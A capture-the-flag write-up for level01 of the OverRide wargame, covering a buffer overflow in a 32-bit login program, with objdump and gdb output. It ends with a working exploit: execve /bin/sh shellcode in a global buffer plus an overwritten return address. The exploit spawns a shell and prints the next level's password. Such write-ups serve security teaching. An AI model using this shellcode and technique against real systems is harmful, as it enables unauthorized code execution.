# Level01

## Analysis

There is neither a call to `/bin/sh` nor an output of the password in this program, so we will have to use a shellcode, store it somewhere and use a buffer overflow over `EIP` to return on that shellcode.

The program uses 2 calls to `fgets()`:
- `fgets(&a_user_name,0x100,stdin); -> buffer with ample size on a global variable, reading 256 bytes`
- `fgets(local_54,100,stdin);      -> local_54 has a size of 64 and we copy a maximum of 100 bytes to it`

It also compares the first 7 characters of the buffer to check if it contains "dat_wil" in `verify_user_name()`, so we can store whatever we want after the first 7 bytes, for example our shellcode.

## Needed elements

To do that we will need to find the address of our first buffer, since it's a named global, we can use `objdump -D` or `objdump -t`:

```bash
level01@OverRide:~$ objdump -t level01       

level01:     file format elf32-i386

SYMBOL TABLE:
08048154 l    d  .interp	00000000              .interp
08048168 l    d  .note.ABI-tag	00000000              .note.ABI-tag
08048188 l    d  .note.gnu.build-id	00000000              .note.gnu.build-id
080481ac l    d  .gnu.hash	00000000              .gnu.hash
080481d0 l    d  .dynsym	00000000              .dynsym
08048250 l    d  .dynstr	00000000              .dynstr
080482ae l    d  .gnu.version	00000000              .gnu.version
080482c0 l    d  .gnu.version_r	00000000              .gnu.version_r
080482e0 l    d  .rel.dyn	00000000              .rel.dyn
080482f0 l    d  .rel.plt	00000000              .rel.plt
08048318 l    d  .init	00000000              .init
08048350 l    d  .plt	00000000              .plt
080483b0 l    d  .text	00000000              .text
0804866c l    d  .fini	00000000              .fini
08048688 l    d  .rodata	00000000              .rodata
0804873c l    d  .eh_frame_hdr	00000000              .eh_frame_hdr
08048780 l    d  .eh_frame	00000000              .eh_frame
08049f14 l    d  .ctors	00000000              .ctors
08049f1c l    d  .dtors	00000000              .dtors
08049f24 l    d  .jcr	00000000              .jcr
08049f28 l    d  .dynamic	00000000              .dynamic
08049ff0 l    d  .got	00000000              .got
08049ff4 l    d  .got.plt	00000000              .got.plt
0804a014 l    d  .data	00000000              .data
0804a020 l    d  .bss	00000000              .bss
00000000 l    d  .comment	00000000              .comment
00000000 l    df *ABS*	00000000              crtstuff.c
08049f14 l     O .ctors	00000000              __CTOR_LIST__
08049f1c l     O .dtors	00000000              __DTOR_LIST__
08049f24 l     O .jcr	00000000              __JCR_LIST__
080483e0 l     F .text	00000000              __do_global_dtors_aux
0804a024 l     O .bss	00000001              completed.6159
0804a028 l     O .bss	00000004              dtor_idx.6161
08048440 l     F .text	00000000              frame_dummy
00000000 l    df *ABS*	00000000              crtstuff.c
08049f18 l     O .ctors	00000000              __CTOR_END__
08048898 l     O .eh_frame	00000000              __FRAME_END__
08049f24 l     O .jcr	00000000              __JCR_END__
08048640 l     F .text	00000000              __do_global_ctors_aux
00000000 l    df *ABS*	00000000              easy.c
08049f14 l       .ctors	00000000              __init_array_end
08049f28 l     O .dynamic	00000000              _DYNAMIC
08049f14 l       .ctors	00000000              __init_array_start
08049ff4 l     O .got.plt	00000000              _GLOBAL_OFFSET_TABLE_
08048630 g     F .text	00000002              __libc_csu_fini
08048632 g     F .text	00000000              .hidden __i686.get_pc_thunk.bx
0804a014  w      .data	00000000              data_start
00000000       F *UND*	00000000              printf@@GLIBC_2.0
00000000       F *UND*	00000000              fgets@@GLIBC_2.0
0804a01c g       *ABS*	00000000              _edata
0804866c g     F .fini	00000000              _fini
08049f20 g     O .dtors	00000000              .hidden __DTOR_END__
080484a3 g     F .text	0000002d              verify_user_pass
0804a014 g       .data	00000000              __data_start
00000000       F *UND*	00000000              puts@@GLIBC_2.0
00000000  w      *UND*	00000000              __gmon_start__
0804a018 g     O .data	00000000              .hidden __dso_handle
0804868c g     O .rodata	00000004              _IO_stdin_used
00000000       F *UND*	00000000              __libc_start_main@@GLIBC_2.0
080485c0 g     F .text	00000061              __libc_csu_init
0804a020 g     O .bss	00000004              stdin@@GLIBC_2.0
0804a0a4 g       *ABS*	00000000              _end
080483b0 g     F .text	00000000              _start
08048688 g     O .rodata	00000004              _fp_hw
0804a01c g       *ABS*	00000000              __bss_start
080484d0 g     F .text	000000e6              main
00000000  w      *UND*	00000000              _Jv_RegisterClasses
08048464 g     F .text	0000003f              verify_user_name
0804a040 g     O .bss	00000064              a_user_name                   <=========
08048318 g     F .init	00000000              _init
```

`0804a040` this is our target we want to jump on, however since there are the first 7 characters ("dat_wil"), we need to shift the address by 7 bytes -> `0804a047`

After this step, we need to get the offset until we reach `%eip` with the second buffer (passed by our second user input):

```bash
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
aaaabbbbccccddddffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyy
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x76767676 in ?? ()
```

Our offset is then 80 bytes.

## Exploit

No we can craft our payload:

`[dat_wil] + [shellcode] | [80 filler] + [jmp addr]`

<details>
  <summary>spoiler</summary>

  ```bash
  level01@OverRide:~$ python -c "print 'dat_wil' + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + '\n' + 'a'*80 + '\x47\xa0\x04\x08'" > /tmp/test                      
  level01@OverRide:~$ cat /tmp/test - | ./level01 
  ********* ADMIN LOGIN PROMPT *********
  Enter Username: verifying username....

  Enter Password: 
  nope, incorrect password...

  whoami
  level02
  cat /home/users/level02/.pass
  PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
  ```
</details>
